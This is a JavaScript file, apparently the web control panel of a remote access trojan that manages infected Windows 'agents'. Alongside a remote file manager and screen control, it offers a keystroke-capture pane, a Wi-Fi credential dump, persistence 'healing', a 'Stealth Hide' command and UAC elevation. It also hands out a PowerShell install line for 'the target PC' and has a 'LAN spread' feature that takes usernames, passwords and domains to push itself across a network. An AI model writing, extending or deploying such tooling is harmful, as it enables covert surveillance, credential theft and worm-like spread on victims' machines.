  if (!path || !state.selected) return;

  const rawName = path.split(/[\/\\]/).filter(Boolean).pop() || "download";

  const tid = "dl-" + Date.now() + "-" + Math.random().toString(36).substr(2, 4);

  if (!state.fe.pendingDownloads) state.fe.pendingDownloads = new Map();

  const info = { tid, name: rawName, path, time: Date.now() };

  state.fe.pendingDownloads.set(rawName.toLowerCase(), info);

  if (!rawName.toLowerCase().endsWith(".zip")) {

    state.fe.pendingDownloads.set((rawName + ".zip").toLowerCase(), info);

  }

  addTransferItem(tid, `Requesting ${rawName}...`, "DOWNLOAD");

  updateTransferItem(tid, `Compressing & streaming from host...`, 50, false, false);

  toast("Requesting download from host...");

  api("/api/download", { method: "POST", body: JSON.stringify({ agent: state.selected, path }) });

}

/* ------------------------------------------------------------------ */

/* Toolbar Buttons & Event Handlers                                   */

/* ------------------------------------------------------------------ */

$("fe-btn-back").onclick = () => navBack();

$("fe-btn-forward").onclick = () => navForward();

$("fe-btn-up").onclick = () => navUp();

$("fe-btn-thispc").onclick = () => navigateTo("This PC");

$("fe-btn-refresh").onclick = () => refreshFiles();

$("fe-breadcrumbs").onclick = () => enableAddressInput();

$("fe-path-input").onkeydown = (e) => {

  if (e.key === "Enter") {

    const p = $("fe-path-input").value.trim();

    disableAddressInput();

    navigateTo(p);

  } else if (e.key === "Escape") {

    disableAddressInput();

  }

};

$("fe-path-input").onblur = () => disableAddressInput();

$("fe-btn-copy-path").onclick = () => {

  navigator.clipboard.writeText(state.fe.currentPath);

  toast("Path copied to clipboard: " + state.fe.currentPath);

};

$("fe-search-input").onkeydown = (e) => {

  if (e.key === "Enter") triggerSearch($("fe-search-input").value);

};

$("fe-btn-search-clear").onclick = () => {

  $("fe-search-input").value = "";

  $("fe-btn-search-clear").classList.add("hidden");

  triggerSearch("");

};

$("fe-btn-new-folder").onclick = () => {

  if (state.fe.isThisPc) return toast("Cannot create folder in This PC");

  const name = prompt("Enter new folder name:", "New folder");

  if (!name || !name.trim()) return;

  const target = joinRemotePath(state.fe.currentPath, name.trim());

  sendCommand(`fs.mkdir "${target}"`);

};

$("fe-btn-new-file").onclick = () => {

  if (state.fe.isThisPc) return toast("Cannot create file in This PC");

  const name = prompt("Enter new filename with extension:", "New Text Document.txt");

  if (!name || !name.trim()) return;

  const target = joinRemotePath(state.fe.currentPath, name.trim());

  sendCommand(`fs.touch "${target}"`);

};

$("fe-btn-download").onclick = () => {

  if (state.fe.isThisPc) return toast("Select a file or open a folder to download");

  if (state.fe.selectedPaths.size === 1) {

    const first = Array.from(state.fe.selectedPaths)[0];

    downloadPath(first);

  } else {

    downloadPath(state.fe.currentPath);

  }

};

$("fe-btn-view-toggle").onclick = () => {

  state.fe.viewMode = state.fe.viewMode === "details" ? "tiles" : "details";

  $("fe-btn-view-toggle").textContent = `View: ${state.fe.viewMode === "details" ? "Details" : "Tiles"}`;

  $("fe-items-body").classList.toggle("view-tiles", state.fe.viewMode === "tiles");

};

$("fe-btn-add-bookmark").onclick = () => {

  if (state.fe.isThisPc) return;

  const path = state.fe.currentPath;

  const name = prompt("Bookmark Name:", path.split(/[\/\\]/).filter(Boolean).pop() || path);

  if (!name) return;

  state.fe.bookmarks.push({ name, path });

  localStorage.setItem("syspy_bookmarks", JSON.stringify(state.fe.bookmarks));

  renderSidebar();

  toast("Bookmark added");

};

$("fe-sb-thispc").onclick = () => navigateTo("This PC");

// Column Header Sorting

document.querySelectorAll(".fe-col.sortable").forEach((col) => {

  col.onclick = () => {

    const sortField = col.dataset.sort;

    if (state.fe.sortBy === sortField) {

      state.fe.sortAsc = !state.fe.sortAsc;

    } else {

      state.fe.sortBy = sortField;

      state.fe.sortAsc = true;

    }

    document.querySelectorAll(".fe-col.sortable .sort-indicator").forEach((el) => el.textContent = "");

    col.querySelector(".sort-indicator").textContent = state.fe.sortAsc ? " ▲" : " ▼";

    renderItemsView();

  };

});

// Select All Checkbox

$("fe-select-all").onchange = (e) => {

  const isChecked = e.target.checked;

  state.fe.selectedPaths.clear();

  if (isChecked) {

    (state.fe.items || []).forEach((it) => state.fe.selectedPaths.add(it.path));

  }

  renderItemSelection();

};

/* ------------------------------------------------------------------ */

/* Drag-and-Drop & Upload Handlers                                    */

/* ------------------------------------------------------------------ */

$("fe-upload-input").onchange = async (event) => {

  const files = Array.from(event.target.files);

  if (!files.length || !state.selected || state.fe.isThisPc) return;

  for (const file of files) {

    const tid = "ul-" + Date.now() + "-" + Math.random().toString(36).substr(2, 4);

    addTransferItem(tid, `${file.name} (${humanSize(file.size)})`, "UPLOAD");

    updateTransferItem(tid, `Uploading to host...`, 40, false, false);

    try {

      const buffer = await file.arrayBuffer();

      const resp = await fetch(

        `/api/upload?agent=${encodeURIComponent(state.selected)}&path=${encodeURIComponent(state.fe.currentPath)}&name=${encodeURIComponent(file.name)}`,

        { method: "POST", headers: { Authorization: "Bearer " + state.token, "Content-Type": "application/octet-stream" }, body: buffer }

      );

      if (resp.ok) {

        updateTransferItem(tid, `Uploaded (${humanSize(file.size)})`, 100, true, false);

        appendTerminal(state.selected, `uploaded ${file.name} to ${state.fe.currentPath}`, "ok");

      } else {

        updateTransferItem(tid, `Failed (HTTP ${resp.status})`, 100, false, true);

      }

    } catch (err) {

      updateTransferItem(tid, `Error: ${err.message}`, 100, false, true);

    }

  }

  toast(`Uploaded ${files.length} file(s) to remote PC`);

  refreshFiles();

  event.target.value = "";

};

const dropzone = $("fe-dropzone");

dropzone.addEventListener("dragover", (e) => {

  e.preventDefault();

  dropzone.classList.add("drag-over");

});

dropzone.addEventListener("dragleave", () => {

  dropzone.classList.remove("drag-over");

});

dropzone.addEventListener("drop", async (e) => {

  e.preventDefault();

  dropzone.classList.remove("drag-over");

  if (state.fe.isThisPc) return toast("Cannot upload to This PC. Navigate into a drive first.");

  const files = Array.from(e.dataTransfer.files);

  if (!files.length || !state.selected) return;

  toast(`Uploading ${files.length} dropped file(s)...`);

  for (const file of files) {

    const tid = "ul-" + Date.now() + "-" + Math.random().toString(36).substr(2, 4);

    addTransferItem(tid, `${file.name} (${humanSize(file.size)})`, "UPLOAD");

    updateTransferItem(tid, `Uploading to host...`, 40, false, false);

    try {

      const buffer = await file.arrayBuffer();

      const resp = await fetch(

        `/api/upload?agent=${encodeURIComponent(state.selected)}&path=${encodeURIComponent(state.fe.currentPath)}&name=${encodeURIComponent(file.name)}`,

        { method: "POST", headers: { Authorization: "Bearer " + state.token, "Content-Type": "application/octet-stream" }, body: buffer }

      );

      if (resp.ok) {

        updateTransferItem(tid, `Uploaded (${humanSize(file.size)})`, 100, true, false);

        appendTerminal(state.selected, `uploaded ${file.name} to ${state.fe.currentPath}`, "ok");

      } else {

        updateTransferItem(tid, `Failed (HTTP ${resp.status})`, 100, false, true);

      }

    } catch (err) {

      updateTransferItem(tid, `Error: ${err.message}`, 100, false, true);

    }

  }

  toast("Upload completed");

  refreshFiles();

});

/* ------------------------------------------------------------------ */

/* Keyboard Shortcuts (F2, Del, Enter, Ctrl+C/X/V, Alt+Left/Up)       */

/* ------------------------------------------------------------------ */

document.addEventListener("keydown", (e) => {

  if (state.tab !== "files") return;

  // If user is currently typing in an input or textarea (outside Monaco), don't intercept

  if (["INPUT", "TEXTAREA"].includes(document.activeElement.tagName) && document.activeElement.id !== "fe-editor-fallback") {

    return;

  }

  // F2 Rename

  if (e.key === "F2") {

    if (state.fe.selectedPaths.size === 1) {

      e.preventDefault();

      const selPath = Array.from(state.fe.selectedPaths)[0];

      const it = (state.fe.items || []).find((x) => x.path === selPath);

      if (it) handleRename(it);

    }

  }

  // Delete

  else if (e.key === "Delete") {

    if (state.fe.selectedPaths.size > 0) {

      e.preventDefault();

      const paths = Array.from(state.fe.selectedPaths);

      paths.forEach((p) => handleDelete(p, e.shiftKey));

    }

  }

  // Enter Open

  else if (e.key === "Enter") {

    if (state.fe.selectedPaths.size === 1) {

      const selPath = Array.from(state.fe.selectedPaths)[0];

      const it = (state.fe.items || []).find((x) => x.path === selPath);

      if (it) {

        e.preventDefault();

        if (it.dir) navigateTo(it.path);

        else openFileInEditor(it.path);

      }

    }

  }

  // Ctrl+C Copy

  else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "c") {

    if (state.fe.selectedPaths.size > 0) {

      e.preventDefault();

      state.fe.clipboard = { op: "copy", paths: Array.from(state.fe.selectedPaths) };

      toast(`Copied ${state.fe.clipboard.paths.length} item(s)`);

    }

  }

  // Ctrl+X Cut

  else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "x") {

    if (state.fe.selectedPaths.size > 0) {

      e.preventDefault();

      state.fe.clipboard = { op: "cut", paths: Array.from(state.fe.selectedPaths) };

      toast(`Cut ${state.fe.clipboard.paths.length} item(s)`);

      renderItemsView();

    }

  }

  // Ctrl+V Paste

  else if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "v") {

    if (state.fe.clipboard.paths && state.fe.clipboard.paths.length > 0) {

      e.preventDefault();

      handlePaste();

    }

  }

  // Alt+Left Back

  else if (e.altKey && e.key === "ArrowLeft") {

    e.preventDefault();

    navBack();

  }

  // Alt+Right Forward

  else if (e.altKey && e.key === "ArrowRight") {

    e.preventDefault();

    navForward();

  }

  // Alt+Up Parent

  else if (e.altKey && e.key === "ArrowUp") {

    e.preventDefault();

    navUp();

  }

  // F5 Refresh

  else if (e.key === "F5") {

    e.preventDefault();

    refreshFiles();

  }

});

/* ------------------------------------------------------------------ */

/* Keys Tracker                                                       */

/* ------------------------------------------------------------------ */

function appendKeys(id, text) {

  if (id !== state.selected) return;

  $("keys-output").textContent += text;

}

$("clear-keys").onclick = () => { $("keys-output").textContent = ""; };

/* ------------------------------------------------------------------ */

/* System & Power Controls                                            */

/* ------------------------------------------------------------------ */

$("power-shutdown-btn").onclick = () => {

  if (confirm("WARNING: Are you sure you want to SHUT DOWN the remote host?")) {

    sendCommand("power.shutdown");

  }

};

$("power-restart-btn").onclick = () => {

  if (confirm("WARNING: Are you sure you want to RESTART the remote host?")) {

    sendCommand("power.restart");

  }

};

const SYSTEM_ACTIONS = [

  ["⚡ Elevate to Admin", "elevate"],

  ["System Report", "info"], ["Processes (ps)", "ps"], ["Wi-Fi Credentials", "wifi"],

  ["Startup Registry", "startup"], ["Persistence Status", "persist.status"], ["Heal Persistence", "heal"],

  ["Stealth Hide", "stealth.hide"], ["Stealth Show", "stealth.show"], ["Lock Machine", "power.lock"],

  ["System Beep", "beep"], ["Show Popup", "msg Remote Administrator Connected"]

];

const topElevBtn = $("elevate-btn");

if (topElevBtn) {

  topElevBtn.onclick = () => {

    sendCommand("elevate");

    toast("UAC elevation requested on host. Accept the prompt on your PC.");

  };

}

function renderSystemActions() {

  const container = $("system-actions");

  if (container.dataset.ready) return;

  container.dataset.ready = "1";

  SYSTEM_ACTIONS.forEach(([label, command]) => {

    const button = document.createElement("button");

    button.textContent = label;

    button.onclick = () => sendCommand(command);

    container.appendChild(button);

  });

}

function renderSystemCards() {

  const agent = state.agents.get(state.selected);

  const container = $("system-cards");

  if (!agent) { container.innerHTML = ""; return; }

  const info = agent.info || {};

  const stats = agent.stats || {};

  const entries = [

    ["Host", info.hostname], ["User", info.user], ["Elevated", String(info.admin)],

    ["OS Platform", info.system], ["IP Address", info.address],

    ["CPU Load", `${(stats.cpu !== undefined ? stats.cpu : "?")}%`],

    ["Memory", `${(stats.ram !== undefined ? stats.ram : "?")}%`],

    ["Idle Duration", `${(stats.idle !== undefined ? stats.idle : "?")}s`],

    ["Battery", stats.battery], ["System Uptime", info.uptime],

    ["Active Window", stats.window], ["Build SHA", agent.sha || agent.version],

  ];

  container.innerHTML = entries.map(([k, v]) =>

    `<div class="card"><div class="k">${escapeHtml(k)}</div><div class="v">${escapeHtml(String(v !== undefined && v !== null ? v : "—"))}</div></div>`

  ).join("");

}

/* ------------------------------------------------------------------ */

/* Tabs and Navigation                                                */

/* ------------------------------------------------------------------ */

function animatePaneIn(paneEl) {
  if (!paneEl) return;
  // Reset to starting state (hidden/offset)
  paneEl.style.opacity = "0";
  paneEl.style.transform = "translateY(4px)";
  paneEl.classList.add("animating");
  // Force reflow
  void paneEl.offsetWidth;
  paneEl.style.opacity = "1";
  paneEl.style.transform = "translateY(0)";
  setTimeout(() => {
    paneEl.classList.remove("animating");
    paneEl.style.opacity = "";
    paneEl.style.transform = "";
  }, 200);
}

document.querySelectorAll(".tab").forEach((tab) => {
  tab.onclick = () => {
    document.querySelectorAll(".tab").forEach((t) => t.classList.remove("active"));
    document.querySelectorAll(".pane").forEach((p) => p.classList.remove("active"));
    tab.classList.add("active");
    const paneEl = $("pane-" + tab.dataset.tab);
    paneEl.classList.add("active");
    animatePaneIn(paneEl);
    state.tab = tab.dataset.tab;
    if (state.tab === "files") refreshFiles();
    if (state.tab === "system") { renderSystemActions(); renderSystemCards(); }
    if (state.tab === "screen") {
      const img = $("screen-img");
      if (img.src && !img.classList.contains("ready")) {
        img.classList.add("ready");
        $("screen-empty").classList.add("hidden");
      }
    }
  };
});

$("refresh").onclick = () => start();

$("broadcast-btn").onclick = () => {

  const command = prompt("Broadcast command to all connected hosts:");

  if (command) api("/api/broadcast", { method: "POST", body: JSON.stringify({ cmd: command }) });

};

$("push-btn").onclick = async () => {

  const btn = $("push-btn");

  btn.disabled = true;

  btn.textContent = "PUSHING...";

  try {

    // Check kit_sha from health to avoid redundant pushes

    const health = await api("/api/health");

    const kitSha = health.kit_sha || "";

    const onlineAgents = [...state.agents.values()].filter(a => a.online);

    if (onlineAgents.length === 0) {

      toast("⚠️ No online agents to push to");

      return;

    }

    if (kitSha) {

      const alreadyCurrent = onlineAgents.filter(a => a.kit_sha && a.kit_sha === kitSha);

      if (alreadyCurrent.length > 0 && alreadyCurrent.length === onlineAgents.length) {

        toast(`✓ All ${alreadyCurrent.length} agent(s) already on current build (${kitSha})`);

        return;

      }

    }

    const result = await api("/api/push", { method: "POST", body: JSON.stringify({}) });

    if (result.error) {

      toast("⚠️ " + result.error);

    } else if (result.message) {

      toast("✓ " + result.message);

    } else {

      const kb = (result.bytes / 1024).toFixed(1);

      const parts = [];

      if (result.sent > 0) parts.push(`${result.sent} sent`);

      if (result.queued > 0) parts.push(`${result.queued} queued`);

      if (result.already_current > 0) parts.push(`${result.already_current} up to date`);

      toast(`✓ Pushed ${kb} KB → ${parts.join(", ")} to ${result.agents} agent(s)`);

    }

  } catch(e) {

    toast("✗ Push failed: " + e.message);

  } finally {

    btn.disabled = false;

    btn.textContent = "PUSH BUILD";

  }

};

function toast(text, type = "") {
  let container = document.getElementById("toast-container");
  if (!container) {
    container = document.createElement("div");
    container.id = "toast-container";
    container.className = "toast-container";
    document.body.appendChild(container);
  }
  const element = document.createElement("div");
  element.className = "toast" + (type ? " " + type : "");
  element.textContent = text;
  container.appendChild(element);
  setTimeout(() => {
    element.classList.add("toast-out");
    setTimeout(() => element.remove(), 220);
  }, 2800);
}

function escapeHtml(value) {

  return String(value !== undefined && value !== null ? value : "").replace(/[&<>"']/g, (c) =>

    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

}

function humanSize(bytes) {

  if (!bytes) return "";

  const units = ["B", "KB", "MB", "GB"];

  let index = 0, value = bytes;

  while (value >= 1024 && index < units.length - 1) { value /= 1024; index++; }

  return `${value.toFixed(index ? 1 : 0)} ${units[index]}`;

}

/* ------------------------------------------------------------------ */

/* Run                                                                */

/* ------------------------------------------------------------------ */

if (state.token) start(); else $("login").classList.remove("hidden");

  if ($("sel-all")) $("sel-all").onchange = (e) => selectAll(e.target.checked);

  if ($("sel-mode")) $("sel-mode").onchange = () => updateSelBar();

  if ($("sel-run")) $("sel-run").onclick = () => {

    const cmd = prompt("Command to run on selected agents:");

    if (cmd) bulk("run", { cmd });

  };

  if ($("addpc-btn")) {

    $("addpc-btn").onclick = async () => {

      try {

        const data = await api("/api/install");

        const line = prompt("Run this on the target PC (PowerShell):", data.line);

        if (line) navigator.clipboard.writeText(line);

        toast("Copied. Paste it into PowerShell on the target.");

      } catch (err) {

        alert("Failed to get install line: " + err);

      }

    };

  }

  if ($("sel-rename")) {

    $("sel-rename").onclick = () => bulk("rename", { pattern: $("sel-pattern").value || "{host}" });

  }

  if ($("sel-push")) $("sel-push").onclick = () => bulk("push");

  if ($("sel-restart")) $("sel-restart").onclick = () => confirm("Restart selected agents?") && bulk("restart");

  if ($("sel-uninstall")) $("sel-uninstall").onclick = () => confirm("Uninstall selected agents?") && bulk("uninstall");

  if ($("sel-purge")) $("sel-purge").onclick = () => confirm("Purge selected agents? Final.") && bulk("purge");

  if ($("lan-btn")) $("lan-btn").onclick = async () => {

    const user = prompt("LAN spread - username (blank = current user):", "") ?? "";

    const password = user ? (prompt("Password:", "") ?? "") : "";

    const domain = user ? (prompt("Domain (blank for local):", "") ?? "") : "";

    if (state.selected) {

      const target = prompt("IP to push (blank = sweep):", "");

      if (target) {

        sendCommand(`lan.push ${target} ${user} ${password} ${domain}`);

      } else {

        sendCommand(user ? `lan.spread ${user} ${password} ${domain}` : "lan.spread");

      }

    } else {

      sendCommand(user ? `lan.spread ${user} ${password} ${domain}` : "lan.spread");

    }

  };

/* ===================================================================

   P0-26 addendum: fullscreen-safe pointer mapping.

   A fullscreened <img> is given position:fixed;inset:0;width:100%;height:100%;

   object-fit:contain by the UA stylesheet, so the element box is the whole

   viewport while the picture is letterboxed inside it. Dividing by

   rect.width scaled every click toward the centre.

   =================================================================== */

function _contentRect(img) {

  const r = img.getBoundingClientRect();

  const nw = img.naturalWidth || 1, nh = img.naturalHeight || 1;

  const fit = getComputedStyle(img).objectFit;

  const scale = (fit === 'cover') ? Math.max(r.width / nw, r.height / nh)

              : (fit === 'fill' || fit === 'none') ? r.width / nw

              : Math.min(r.width / nw, r.height / nh);

  return { x: r.left + (r.width - nw * scale) / 2,

           y: r.top + (r.height - nh * scale) / 2, scale };

}

function _toAgentCoords(ev, img) {

  const c = _contentRect(img);

  const nw = img.naturalWidth || 1, nh = img.naturalHeight || 1;

  return {

    x: Math.min(Math.max(Math.round((ev.clientX - c.x) / c.scale), 0), nw - 1),

    y: Math.min(Math.max(Math.round((ev.clientY - c.y) / c.scale), 0), nh - 1),

  };

}

function _screenPoint(ev) {

  const img = document.getElementById('screen-img');

  if (!img || !img.naturalWidth) return null;

  return _toAgentCoords(ev, img);

}

(function () {

  const img = document.getElementById('screen-img');

  if (img) {

    img.addEventListener('click', function (ev) {

      if (!state.interactive || !state.selected) return;

      const p = _screenPoint(ev);

      if (!p) return;

      ev.preventDefault();

      send('mouse clickat ' + p.x + ' ' + p.y);

    });

    img.addEventListener('contextmenu', function (ev) {

      if (!state.interactive || !state.selected) return;

      const p = _screenPoint(ev);

      if (!p) return;

      ev.preventDefault();

      send('mouse rightat ' + p.x + ' ' + p.y);

    });

  }

  const btn = document.getElementById('fs-btn');

  if (btn) {

    btn.addEventListener('click', async function () {

      const wrap = document.getElementById('screen-interactive-wrap');

      if (!wrap) return;

      try {

        if (document.fullscreenElement) await document.exitFullscreen();

        else await wrap.requestFullscreen();

      } catch (e) { toast('fullscreen refused: ' + e.message); }

      setTimeout(function () { if (img) img.focus(); }, 80);

    });

  }

  document.addEventListener('fullscreenchange', function () {

    const b = document.getElementById('fs-btn');

    if (b) b.textContent = document.fullscreenElement ? 'Exit Fullscreen' : 'Fullscreen';

    if (img) img.focus();

  });

  // Typing goes to the document while the screen tab is up; the <img> is not a

  // reliable focus target.

  document.addEventListener('keydown', function (ev) {

    if (state.tab !== 'screen' || !state.interactive || !state.selected) return;

    if (ev.ctrlKey || ev.metaKey || ev.altKey) return;

    if (ev.key.length === 1 || ev.key === 'Enter' || ev.key === 'Backspace') {

      ev.preventDefault();

      send('type ' + (ev.key === 'Enter' ? '\n' : ev.key));

    }

  });

})();

